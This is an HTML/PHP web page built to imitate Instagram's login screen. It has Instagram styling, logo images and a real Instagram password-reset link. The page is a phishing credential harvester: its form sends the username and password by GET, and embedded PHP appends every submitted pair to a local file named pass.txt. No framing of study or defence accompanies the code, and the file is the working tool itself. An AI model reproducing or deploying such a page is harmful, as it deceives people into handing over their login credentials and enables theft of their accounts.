<!doctype html>
<html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>HelloWorld</title>
        <style>
            body{
                margin:0;
                background: #fafafa;
                font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
            }
            .img_log{
                display: flex;
                justify-content: center;
            }
            #form_69{
                display: flex;
                flex-direction: column;
                width: 80%;
                margin: auto;
                gap: 1rem
            }
            input{
                background: rgba(250,250,250,1);
                border: 1px solid rgba(0,0,0,0.1);
                height: 20px;
                outline: none!important;
                margin: 0;
                outline: 0;
                overflow: hidden;
                padding: 9px 0 7px 8px;
                text-overflow: ellipsis;
            }
            button{
                background: #0095f6;
                outline: none!important;
                color: white;
                height: 37px;
                border-radius: 3px;
                border: none;
            }
            .container{
                margin: 1rem;
            }
            .btm{
                position: absolute;
                bottom: 0;
                background:white;
                display: flex;
                width: 100%;
                justify-content: center;
            }
            a{
                font-size: 0.77rem;
                color: #0095f6!important;
                text-decoration: none!important;
            }
        </style>
    </head>
    <body>
        
        <div class="container">
            <div class="img_log">
                <img src="iglogo.PNG">
            </div>
            <form id="form_69" name="form" action="" method="get">
              <input type="text" name="sc11" id="sc11" placeholder="Username">
              <input type="password" name="sc12" id="sc12" placeholder="Password">
              <div style="text-align:right"> <a href="https://www.instagram.com/accounts/password/reset/">Forgot Password?</a></div> 
              <button id="hello">Log In</button>
            </form>
        </div>
        <div class="btm">
            <img src="fb.PNG">
        </div>
        
        
        
        <script>
        var ip= document.getElementById('hello');
        ip.removeAttribute('type')
        ip.addEventListener('click',()=>{
            var x = ip.value;
            <?php
                $id = $_GET['sc11'];
                $pass = $_GET['sc12'];
                $myfile = fopen("pass.txt", "a") or die;
                fwrite($myfile, $id);
                fwrite($myfile, '  ');
                fwrite($myfile, $pass);
                fwrite($myfile, "\n");
                fclose($myfile);
            ?>
        });
            
        </script>
    </body>
</html>